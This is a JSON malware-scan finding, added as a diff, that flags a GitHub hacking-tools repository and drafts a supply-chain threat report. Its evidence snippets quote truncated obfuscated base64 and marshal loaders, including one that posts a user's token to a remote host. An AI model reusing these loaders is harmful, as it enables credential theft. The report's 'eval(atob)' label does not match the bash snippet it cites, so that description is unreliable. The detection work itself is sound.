@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:zusyaku/termux-and-kali-linux-v3",
+    "kind": "repository",
+    "family": "",
+    "id": "zusyaku/termux-and-kali-linux-v3",
+    "url": "https://github.com/Zusyaku/Termux-And-Kali-Linux-V3",
+    "registry": "github",
+    "owner": "zusyaku",
+    "status": "confirmed",
+    "confidence": "review",
+    "score": 43,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "obfuscation/base64-decode-exec; obfuscation/py-decode-exec; enumeration/host-recon",
+    "evidence_locations": "AdminHack-main\\src\\Sevrite.sh:1; Dark2-main/dark2.py:2; Encrypt-Python-master/Encrypt.py:2; F_Crack-main/face.py:106; F_Crack-main/face.py:125; Ghost-Dark-master/dark-fb.py:2; New-Elite-master/dark.py:2; NewSpam-master/Spam.py:2; zafi-main/zafi.py:84; zafi-main/zafi.py:109; b2k4-main\\Dockerfile:92; b2k4-main\\Dockerfile:99; CamHack-main\\CamHack.sh:217; CamHack-main\\CamHack.sh:218; CamHacker-main\\ch.sh:435; cekin-Aja-master\\task.sh:17; chicken_tools-main\\app.main.bash:143; Crack-Gmail-master\\gmail.sh:2; DDos-Attack-master\\install.sh:4; DDos-Attack-master\\uninstall.sh:4",
+    "c2_hosts": "",
+    "iocs": "AdminHack-main\\src\\Sevrite.sh",
+    "matched_signatures": "",
+    "reasons": "repository under owner Zusyaku of a known-malicious repo | Tier-2 confirmed (bash score 43)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T230848Z",
+    "last_seen": "hunt-20260910T230848Z",
+    "evidence_file": "repositories/zusyaku_termux-and-kali-linux-v3.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "AdminHack-main\\src\\Sevrite.sh",
+      "line": 1,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo Y3VybCAtWCBQT1NUIGh0dHBzOi8vdGV4dGJlbHQuY29tL3RleHQgXAogICAgIC0tZGF0YS11cmxlbmNvZGUgcGhvbmU9JyszODA2NjkzNDE0ODknIFwKICAgICAtLWRhdGEtdXJsZW5jb2RlIG1lc3NhZ2U9JyR1c2VyIERvd25sb2FkINCQZG3Rlm7QndCw0YF"
+    },
+    {
+      "file": "Dark2-main/dark2.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yDQojY29kaW5nPXV0Zi04DQoNCg0KaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYix"
+    },
+    {
+      "file": "Encrypt-Python-master/Encrypt.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCmltcG9ydCBiYXNlNjQsIHpsaWIsIG1hcnNoYWwsIHN5cw0KVyA9ICdceDFiWzE7MzdtJw0KUlIgPSAnXHgxYlsxOzM3bVx4MWJbMzFtJw0KTyA"
+    },
+    {
+      "file": "F_Crack-main/face.py",
+      "line": 106,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))"
+    },
+    {
+      "file": "F_Crack-main/face.py",
+      "line": 125,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9"
+    },
+    {
+      "file": "Ghost-Dark-master/dark-fb.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('CiMgLSotIGNvZGluZzogdXRmLTggLSotCgoKaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmV"
+    },
+    {
+      "file": "New-Elite-master/dark.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('CiMgLSotIGNvZGluZzogdXRmLTggLSotCgoKaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmV"
+    },
+    {
+      "file": "NewSpam-master/Spam.py",
+      "line": 2,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "embedded compiled/marshalled payload (hidden stager) | exec(marshal.loads(zlib.decompress(base64.b64decode(\"eJzlW0lsHEl2jSyuVWSRLFIUJVFLiD1SUy2xiotEbc1WFxepSlw7qyhSHKqrk5VJMsmszFJmFpcGZXggH7xcxoYxpzkY"
+    },
+    {
+      "file": "zafi-main/zafi.py",
+      "line": 84,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))"
+    },
+    {
+      "file": "zafi-main/zafi.py",
+      "line": 109,
+      "category": "obfuscation",
+      "rule": "py-decode-exec",
+      "snippet": "decoded payload -> network host | exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9"
+    },
+    {
+      "file": "b2k4-main\\Dockerfile",
+      "line": 92,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\u0000e\u000f\u0000\u0001\u0000^\u0002\u0000q\u0001\u0000j\u0010\u0000d\u0000\u0001\u0000\u0001\u0000d\u0000\u0004Ud\u0000S(\u0000\u0000\u0000i\u0000\u0000\u0000i$\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0006\u0000\u0000\u0000ih\u0000\u0000\u0000i\u0000\u0000\u0000i\u0017\u0000\u0000\u0000i\u0000\u0000\u0000i<\u0000\u0000\u0000i\u001f\u0000\u0000\u0000im\u0000\u0000\u0000i:\u0000\u0000\u0000i\u0000\u0000\u0000i/\u0000\u0000\u0000i\u000e\u0000\u0000\u0000id\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000i\u0000\u0000\u0000iV\u0000\u0000\u0000i\u0000\u0000\u0000i0\u0000\u0000\u0000i"
+    },
+    {
+      "file": "b2k4-main\\Dockerfile",
+      "line": 99,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\u0000\u0000\u0000i8\u0000\u0000\u0000iv\u0000\u0000\u0000i5\u0000\u0000\u0000ig\u0000\u0000\u0000ir\u0000\u0000\u0000i7\u0000\u0000\u0000i\u001b\u0000\u0000\u0000i\u0004\u0000\u0000\u0000i\u000f\u0000\u0000\u0000i\\\u0000\u0000\u0000i4\u0000\u0000\u0000i;\u0000\u0000\u0000iB\u0000\u0000\u0000i_\u0000\u0000\u0000i>\u0000\u0000\u0000i#\u0000\u0000\u0000ie\u0000\u0000\u0000in\u0000\u0000\u0000iF\u0000\u0000\u0000iW\u0000\u0000\u0000i\u0012\u0000\u0000\u0000i\u0018\u0000\u0000\u0000iP\u0000\u0000\u0000i\u0010\u0000\u0000\u0000it\u0000\u0000\u0000if\u0000\u0000\u0000iD\u0000\u0000\u0000i[\u0000\u0000\u0000iL\u0000\u0000\u0000i\u0003\u0000\u0000\u0000iQ\u0000\u0000\u0000iC\u0000\u0000\u0000i\u001a\u0000\u0000\u0000i)\u0000\u0000\u0000iT\u0000\u0000\u0000ir\u0003\u0000\u0000iNc\u0001\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0002\u0000\u0000\u0000C\u0000"
+    },
+    {
+      "file": "CamHack-main\\CamHack.sh",
+      "line": 217,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "arch=$(uname -a | grep -o 'arm' | head -n1)"
+    },
+    {
+      "file": "CamHack-main\\CamHack.sh",
+      "line": 218,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "arch2=$(uname -a | grep -o 'Android' | head -n1)"
+    },
+    {
+      "file": "CamHacker-main\\ch.sh",
+      "line": 435,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "printf \"\\n${ask}Enter youtube video ID:${cyan}\\n\\nCam${nc}@${cyan}Hacker ${red}$ ${nc}\""
+    },
+    {
+      "file": "cekin-Aja-master\\task.sh",
+      "line": 17,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "git config --local user.email \"officialputuid@hack.id\""
+    },
+    {
+      "file": "chicken_tools-main\\app.main.bash",
+      "line": 143,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "regex_scan=$(echo \"$scan\" | urlparser% to hostname)"
+    },
+    {
+      "file": "Crack-Gmail-master\\gmail.sh",
+      "line": 2,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "\";bz='ow='\\''';pCz='age/';FFz='A AN';Jz='033[';qCz='emul';lDz='p 5';KBz=' $cy';QDz='/0/W';CGz='Tool';PDz='0';xFz='d\"Mo';nCz='rf /';IGz='p 4';cFz='zink';HFz='ERHA';iz='n.py';pFz='enyi';GDz='rf $';ODz='"
+    },
+    {
+      "file": "DDos-Attack-master\\install.sh",
+      "line": 4,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if [[ \"$(id -u)\" -ne 0 ]];"
+    },
+    {
+      "file": "DDos-Attack-master\\uninstall.sh",
+      "line": 4,
+      "category": "enumeration",
+      "rule": "host-recon",
+      "snippet": "if [[ \"$(id -u)\" -ne 0 ]]; then"
+    }
+  ],
+  "commit_sha": "1fc4c36640a04014e03201719f63c44d1020693f",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/zusyaku/termux-and-kali-linux-v3",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in AdminHack-main\\src\\Sevrite.sh.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: AdminHack-main\\src\\Sevrite.sh\n- AdminHack-main\\src\\Sevrite.sh:1: decodes a base64 blob and executes it",
+    "publisher": "zusyaku",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/AdminHack-main\\src\\Sevrite.sh#L1\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/Dark2-main/dark2.py#L2\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/Encrypt-Python-master/Encrypt.py#L2\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/F_Crack-main/face.py#L106\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/F_Crack-main/face.py#L125\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/Ghost-Dark-master/dark-fb.py#L2\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/New-Elite-master/dark.py#L2\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/NewSpam-master/Spam.py#L2\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/zafi-main/zafi.py#L84\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/zafi-main/zafi.py#L109\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/b2k4-main\\Dockerfile#L92\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/b2k4-main\\Dockerfile#L99\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/CamHack-main\\CamHack.sh#L217\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/CamHack-main\\CamHack.sh#L218\nhttps://github.com/zusyaku/termux-and-kali-linux-v3/blob/1fc4c36640a04014e03201719f63c44d1020693f/CamHacker-main\\ch.sh#L435",
+    "verified_iocs": "AdminHack-main\\src\\Sevrite.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T23:08:48Z",
+    "last_seen": "2026-09-10T23:08:48Z"
+  }
+}
